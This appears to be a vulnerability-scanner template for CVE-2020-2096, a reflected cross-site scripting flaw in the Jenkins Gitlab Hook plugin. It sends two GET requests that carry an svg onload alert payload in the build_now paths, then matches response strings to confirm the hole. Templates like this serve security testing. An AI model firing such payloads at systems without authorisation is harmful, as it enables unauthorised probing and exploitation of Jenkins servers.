id: cve-2020-2096
info:
  name: Jenkins Gitlab Hook XSS
  risk: Medium

params:
  - root: '{{.BaseURL}}'

requests:
  - method: GET
    redirect: false
    url: >-
      {{.root}}/gitlab/build_now/a'"><svg/onload=alert(document.domain)>
    detections:
      - >-
        StringSearch("response", "know how to process") || StringSearch("response", "See https://github.com/elvanja/jenkins-gitlab-hook-plugin for details")
      - >-
        StatusCode() == 200 && StringSearch("response", "Gitlab Web Hook")
  - method: GET
    redirect: false
    url: >-
      {{.root}}/git/build_now/a'"><svg/onload=alert(document.domain)>
    detections:
      - >-
        StringSearch("response", "know how to process") || StringSearch("response", "See https://github.com/elvanja/jenkins-gitlab-hook-plugin for details")
      - >-
        StatusCode() == 200 && StringSearch("response", "Gitlab Web Hook")

references:
  - author: j3ssie
  - link: https://www.cvebase.com/cve/2020/2096
